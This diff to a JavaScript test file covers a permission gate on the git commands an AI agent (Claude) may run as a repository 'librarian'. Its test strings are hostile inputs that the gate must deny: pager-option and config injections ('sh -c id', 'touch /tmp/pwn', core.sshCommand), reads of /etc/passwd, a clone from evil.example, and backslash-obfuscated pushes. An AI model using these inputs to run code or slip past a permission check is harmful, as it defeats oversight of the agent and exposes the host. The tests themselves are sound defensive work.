@@ -116,17 +116,35 @@ test('security: Bash allow rules reach canUseTool; every role keeps the outcome 
   assert.equal(await bash(builder, 'npm install left-pad', true), 'allow');
 
   // The research pack's librarian: its checked rules decide; Claude gets only the WebFetch allow rules.
-  const librarian = {
-    allow: ['Bash(@git-clone-public /tmp/alp-librarian)', 'Bash(@git-read /tmp/alp-librarian)', 'WebFetch(domain:github.com)'],
-    ask: ['Bash(git clone:*)', 'Bash(git -C:*)'], deny: ['Bash(@git-unsafe)', 'Bash(git push:*)', 'Bash(rm:*)'], beyondMode: 'refuse',
-  };
-  const library = claudePermissions('read-only', () => 'read-only', { ...librarian, floor: 'read-only', floorRoot: root });
-  assert.deepEqual(library.allowedTools, ['WebFetch(domain:github.com)']);
-  assert.equal(await bash(library, 'git clone --depth 50 https://github.com/a/b /tmp/alp-librarian/a-b', true), 'allow');
-  assert.equal(await bash(library, 'git -C /tmp/alp-librarian/a-b fetch --depth 50', true), 'allow');
-  assert.equal(await bash(library, 'git -C /tmp/alp-librarian/../x push', true), 'deny');
-  assert.equal(await bash(library, 'git -C /tmp/alp-librarian/a-b -c core.sshCommand=x fetch', true), 'deny');
-  // Asked about with no one to ask (no ask callback here): refused.
-  assert.equal(await bash(library, 'git clone https://evil.example/a/b /tmp/alp-librarian/a-b', true), 'deny');
-  assert.equal(await bash(library, 'git -C /tmp/alp-librarianX log', true), 'deny');
+  // A scratch 0700 directory stands in for its per-user root (~/.alp-librarian-cache), so nothing is made in /tmp or ~.
+  const clones = await mkdtemp(path.join(os.tmpdir(), 'alp-librarian-gate-'));
+  try {
+    const librarian = {
+      allow: [`Bash(@git-clone-public ${clones})`, `Bash(@git-read ${clones})`, 'WebFetch(domain:github.com)'],
+      ask: ['Bash(git clone:*)', 'Bash(git -C:*)'], deny: ['Bash(@git-unsafe)', 'Bash(git push:*)', 'Bash(rm:*)'], beyondMode: 'refuse',
+    };
+    const library = claudePermissions('read-only', () => 'read-only', { ...librarian, floor: 'read-only', floorRoot: root });
+    assert.deepEqual(library.allowedTools, ['WebFetch(domain:github.com)']);
+    if (process.platform !== 'win32') {
+      assert.equal(await bash(library, `git clone --depth 50 https://github.com/a/b ${clones}/a-b`, true), 'allow');
+      assert.equal(await bash(library, `git -C ${clones}/a-b fetch --depth 50`, true), 'allow');
+      assert.equal(await bash(library, `git -C ${clones}/a-b grep -n -e foo -- lib`), 'allow');
+    }
+    assert.equal(await bash(library, `git -C ${clones}/../x push`, true), 'deny');
+    assert.equal(await bash(library, `git -C ${clones}/a-b -c core.sshCommand=x fetch`, true), 'deny');
+    // Asked about with no one to ask (no ask callback here): refused.
+    assert.equal(await bash(library, `git clone https://evil.example/a/b ${clones}/a-b`, true), 'deny');
+    assert.equal(await bash(library, `git -C ${clones}X log`, true), 'deny');
+    // Round 2: abbreviated and clustered options that run a pager command, and path options that read outside the
+    // clone, are not allowed, in the sandbox or out of it.
+    for (const args of ["grep --open-f='touch /tmp/pwn #' hi", "grep --open='sh -c id' hi", 'grep -iOtouch hi', 'grep -nOtouch hi', 'grep --file=/etc/passwd', 'blame --contents=/etc/passwd a.js', 'blame --ignore-revs-file=/etc/passwd a.js', 'ls-files --exclude-from=/etc/passwd']) {
+      assert.equal(await bash(library, `git -C ${clones}/a-b ${args}`, true), 'deny', args);
+    }
+    // A checked deny rule holds inside the sandbox too: Claude cannot match Bash(@git-unsafe) itself.
+    for (const command of ['g\\it push $X', `git -C ${clones}/a-b pu\\sh`, `git -C ${clones}/a-b -c core.pager=x log`]) {
+      assert.equal(await bash(library, command), 'deny', command);
+    }
+    // Commands no rule covers still run in the read-only sandbox, as before.
+    assert.equal(await bash(library, 'git log --oneline -5'), 'allow');
+  } finally { await rm(clones, { recursive: true, force: true }); }
 });
